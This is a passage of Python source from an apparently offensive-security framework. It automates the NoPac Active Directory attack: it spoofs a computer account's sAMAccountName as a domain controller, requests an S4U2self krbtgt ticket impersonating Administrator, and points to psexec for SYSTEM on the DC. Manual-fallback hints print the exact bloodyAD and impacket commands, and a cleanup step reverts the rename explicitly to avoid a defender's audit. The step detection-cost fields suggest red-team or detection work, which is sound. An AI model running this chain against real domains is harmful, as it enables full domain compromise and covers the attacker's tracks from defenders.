    dn = f"CN={computer},CN=Computers,{_dn_from_domain(domain)}"
    argv = [tool,
            "--host", chain.target,
            "-u", user, "-p", pw, "-d", domain,
            "set", "object", dn,
            "sAMAccountName", "-v", dc_name]
    result = runner_mod.run(argv, timeout=getattr(ctx, "nopac_timeout", 60))
    if result.error:
        return Outcome(kind="fail",
                        evidence=f"bloodyAD vanished: {result.error}")
    if result.timed_out:
        return Outcome(kind="fail",
                        evidence="bloodyAD sam-spoof timed out")
    output = (result.stdout or "") + (result.stderr or "")
    # bloodyAD's success on a set-object call is silent — non-empty
    # stderr with a Traceback / error string is failure; empty +
    # exit 0 is success.
    if "Traceback" in output or "Error" in output or "denied" in output.lower():
        return Outcome(
            kind="fail",
            evidence=f"bloodyAD failed: {output.strip()[:200]}",
            data={"detail": output[-1024:]})
    return Outcome(
        kind="ok",
        evidence=f"renamed {computer} → {dc_name} (no trailing $) via bloodyAD",
        data={"nopac_dc_name": dc_name})


def _nopac_s4u2self_action(chain, ctx):
    """S4U2self via the DC-named computer account. Because
    sAMAccountName now matches a real DC (minus its $), the KDC
    (CVE-2021-42287) mints a service ticket for krbtgt — usable
    as a TGT for the DC computer account → Administrator via
    pass-the-ticket. Uses ``impacket-getST`` when on PATH."""
    import os as _os
    import shutil
    from . import runner as runner_mod
    dc_name = chain.artifacts.get("nopac_dc_name") \
        or getattr(ctx, "dc_name", None) or "DC01"
    impersonate = getattr(ctx, "impersonate", None) or "Administrator"
    computer = chain.artifacts.get("nopac_computer", _NOPAC_COMPUTER)
    password = chain.artifacts.get("nopac_password", _NOPAC_PASSWORD)
    tool = getattr(ctx, "nopac_getst_bin", None) \
        or shutil.which("impacket-getST") \
        or shutil.which("getST.py")
    if not tool:
        return Outcome(
            kind="manual",
            evidence=(f"impacket-getST not on PATH — run:\n"
                      f"  impacket-getST -self -impersonate "
                      f"'{impersonate}' -spn 'krbtgt/{dc_name}' "
                      f"'{computer}:{password}'"))
    argv = [tool,
            "-self",
            "-impersonate", impersonate,
            "-spn", f"krbtgt/{dc_name}",
            f"{computer}:{password}"]
    result = runner_mod.run(argv, timeout=getattr(ctx, "nopac_timeout", 60))
    if result.error:
        return Outcome(kind="fail",
                        evidence=f"impacket-getST vanished: {result.error}")
    if result.timed_out:
        return Outcome(kind="fail",
                        evidence="impacket-getST timed out")
    output = (result.stdout or "") + (result.stderr or "")
    if "KDC_ERR_S_PRINCIPAL_UNKNOWN" in output:
        return Outcome(
            kind="fail",
            evidence=(f"KDC refused the S4U2self — DC likely patched for "
                      f"CVE-2021-42287 (Nov 2021 rollup KB5008380). "
                      f"NoPac chain aborts here."),
            data={"detail": output[-1024:]})
    ccache = f"{impersonate}.ccache"
    if _os.path.exists(ccache):
        return Outcome(
            kind="ok",
            evidence=(f"S4U2self ticket saved to {ccache}; use with "
                      f"`KRB5CCNAME={ccache} impacket-psexec "
                      f"'{dc_name}$'@{chain.target} -k -no-pass`"),
            data={"nopac_ccache": ccache})
    return Outcome(
        kind="fail",
        evidence=f"impacket-getST didn't produce a ccache: {output.strip()[:200]}",
        data={"detail": output[-1024:]})


def _nopac_restore_action(chain, ctx):
    """Rename the sAMAccountName back to ``FKPWN$`` (or the
    computer name from artifacts) so the operator's footprint
    on the domain is a plain computer account rather than an
    on-brand DC name that would trip a defender's next audit
    of the Computers OU. Uses bloodyAD when on PATH."""
    import shutil
    from . import runner as runner_mod
    cred = getattr(ctx, "cred", None) or {}
    domain = getattr(ctx, "domain", None) or "<domain>"
    user = cred.get("username", "<user>")
    pw = cred.get("password", "<pass>")
    computer = chain.artifacts.get("nopac_computer", _NOPAC_COMPUTER)
    tool = getattr(ctx, "nopac_bloodyad_bin", None) \
        or shutil.which("bloodyAD") \
        or shutil.which("bloodyad")
    if not tool:
        return Outcome(
            kind="manual",
            evidence=(f"bloodyAD not on PATH — run:\n"
                      f"  bloodyAD --host {chain.target} -u '{user}' "
                      f"-p '{pw}' -d '{domain}' set object "
                      f"'CN={computer},CN=Computers,"
                      f"{_dn_from_domain(domain)}' sAMAccountName "
                      f"-v '{computer}$'"))
    dn = f"CN={computer},CN=Computers,{_dn_from_domain(domain)}"
    argv = [tool,
            "--host", chain.target,
            "-u", user, "-p", pw, "-d", domain,
            "set", "object", dn,
            "sAMAccountName", "-v", f"{computer}$"]
    result = runner_mod.run(argv, timeout=getattr(ctx, "nopac_timeout", 60))
    if result.error or result.timed_out:
        return Outcome(kind="manual",
                        evidence=("bloodyAD revert failed — "
                                   f"restore manually: `bloodyAD ... "
                                   f"set object '{dn}' sAMAccountName "
                                   f"-v '{computer}$'`"))
    output = (result.stdout or "") + (result.stderr or "")
    if "Traceback" in output or "Error" in output or "denied" in output.lower():
        return Outcome(
            kind="manual",
            evidence=(f"bloodyAD revert produced errors — {output.strip()[:120]}; "
                      "restore manually"))
    return Outcome(
        kind="ok",
        evidence=f"restored sAMAccountName {computer}$ (rollback complete)")


def _dn_from_domain(domain):
    """CORP.LOCAL → DC=CORP,DC=LOCAL for a rough default DN."""
    if not domain:
        return "DC=corp,DC=local"
    return ",".join(f"DC={p}" for p in domain.split("."))


@register("nopac")
def nopac_chain(target_dc, cred=None, domain=None, impersonate=None):
    """NoPac (CVE-2021-42287 + CVE-2021-42278): sAMAccountName spoof
    + S4U2self on a controllable computer account → DC-authored
    service ticket for Administrator → SYSTEM on the target DC.

    Requires: a low-priv authenticated domain user (any account
    the domain accepts an LDAP bind for), ms-DS-MachineAccountQuota
    > 0 on the domain root (default is 10), the DC unpatched for
    CVE-2021-42287 and CVE-2021-42278 (rollup KB5008380 /
    KB5008218 shipped November 2021).

    6 steps: reachability → discover:maq → create:computer-account
    → modify:sam-spoof → request:s4u2self-tgt → cleanup:restore-sam.
    The create/modify/s4u2self/restore steps shell out to
    ``impacket-addcomputer`` / ``bloodyAD`` / ``impacket-getST``
    when the tools are on PATH — a full walk against a vulnerable
    lab DC lands the S4U2self ccache and reverts the
    sAMAccountName cleanly. When the tools aren't on PATH each
    step falls back to a manual-outcome hint naming the exact
    command, so the operator can drive the chain by hand.

    A patched DC refuses the S4U2self request (KDC validates the
    sAMAccountName no longer matches a real DC after the rename
    gate); the operator sees a KDC_ERR_S_PRINCIPAL_UNKNOWN from
    the request:s4u2self-tgt step, which the walker classifies
    as fail → chain aborts.
    """
    _ = cred, domain, impersonate      # threaded via ctx by the CLI
    return Chain(
        profile="nopac",
        target=target_dc,
        steps=(
            REACHABILITY_STEP,
            Step("discover:maq",
                 "attacker-side",
                 _nopac_quota_action,
                 detection_cost=0,
                 signals=SIGNALS_NOPAC_QUOTA_CHECK),
            Step("create:computer-account",
                 "attacker-side",
                 _nopac_addcomputer_action,
                 detection_cost=3,
                 signals=SIGNALS_NOPAC_ADDCOMPUTER),
            Step("modify:sam-spoof",
                 "attacker-side",
                 _nopac_sam_spoof_action,
                 detection_cost=3,
                 signals=SIGNALS_NOPAC_SAM_SPOOF),
            Step("request:s4u2self-tgt",
                 "attacker-side",
                 _nopac_s4u2self_action,
                 detection_cost=2,
                 signals=SIGNALS_NOPAC_S4U2SELF),
            Step("cleanup:restore-sam",
                 "attacker-side",
                 _nopac_restore_action,
                 detection_cost=1,
                 signals=SIGNALS_NOPAC_RESTORE),
        ))


# ---------------------------------------------------------------- user chain auto-load

# Load any YAML-defined profiles from ~/.fieldkit/chains/ into
# the registry. Silently skips malformed files (prints stderr
# warnings) rather than breaking chain-module import; a broken
# user file shouldn't prevent shipped profiles from loading.
# See fieldkit/chain_yaml.py for the schema + register/install
# helpers, and `fieldkit chain register --from-yaml <path>` for
# the operator-facing install command.
def _load_user_chains_on_import():
    try:
        from . import chain_yaml as _cy
        _cy.load_user_chains()
    except Exception:                                       # noqa: BLE001
        # Never let user-chain loading fail chain module import —
        # a syntax error in ~/.fieldkit/chains/foo.yaml shouldn't
        # brick the whole tool.
        pass


_load_user_chains_on_import()
